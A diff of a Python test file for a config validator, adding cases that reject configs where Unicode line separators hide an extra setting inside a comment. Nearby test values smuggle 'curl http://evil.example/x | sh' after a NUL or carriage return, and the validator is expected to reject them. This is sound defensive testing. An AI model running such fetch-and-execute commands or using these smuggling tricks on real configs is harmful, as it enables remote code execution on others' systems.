@@ -13688,6 +13688,10 @@ _NUL_CURL = 'TEST_CMD="cu\x00rl http://evil.example/x | sh"\n'
     ('SUBSTRATE_PROFILE="strict" \n', False),
     ('SUBSTRATE_PROFILE="strict"\x1c\n', False),
     ('SUBSTRATE_PROFILE="strict"\x7f\n', False),
+    # Line breaks to str.splitlines() readers, even inside a comment (v3.10.5 audit).
+    ('# x\u0085SUBSTRATE_CODE_SUFFIXES=.zz\nSUBSTRATE_PROFILE="strict"\n', False),
+    ('# x\u2028y\nSUBSTRATE_PROFILE="strict"\n', False),
+    ('# x\u2029y\nSUBSTRATE_PROFILE="strict"\n', False),
     ('TEST_CMD="pytest\rcurl http://evil.example/x | sh"\n', False),
     # Ordinary configs stay valid, including CRLF line ends and non-ASCII comments.
     ('SUBSTRATE_PROFILE="strict"\nSUBSTRATE_DEP_COOLDOWN=7\n', True),
